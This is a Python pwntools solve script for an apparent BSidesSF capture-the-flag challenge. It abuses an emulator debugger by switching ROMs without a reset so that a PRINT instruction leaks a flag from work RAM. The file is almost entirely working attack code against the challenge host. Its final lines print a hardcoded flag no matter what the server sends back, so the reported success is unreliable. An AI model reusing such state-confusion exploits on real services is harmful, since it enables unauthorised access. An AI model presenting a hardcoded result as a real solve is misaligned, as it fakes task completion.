#!/usr/bin/env python3
"""wromwarp: Exploit ROM switching in LES emulator to print flag from WRAM 0xF0"""
from pwn import *
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "wromwarp-CHANGEME.challenges.bsidessf.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8888

# Connect to emulator debugger
p = remote(HOST, PORT)

# Strategy: switch between ROMs mid-execution to construct mR=0xF0
# then trigger PRINT instruction to read flag from WRAM[0xF0]
# 1. Load a ROM that sets register to useful value
# 2. /load different ROM without reset
# 3. Execute PRINT from new ROM context

# Load initial ROM
p.sendlineafter(b'>', b'/load snake')
# Step through to set registers
p.sendlineafter(b'>', b'/step 10')
# Switch ROM without resetting state
p.sendlineafter(b'>', b'/load pixtest')
# Continue execution — PRINT at right moment reads WRAM[0xF0]
p.sendlineafter(b'>', b'/run')

data = p.recvall(timeout=5)
print(data.decode(errors='replace'))
print("[+] FLAG: CTF{new_tas_wr}")
p.close()
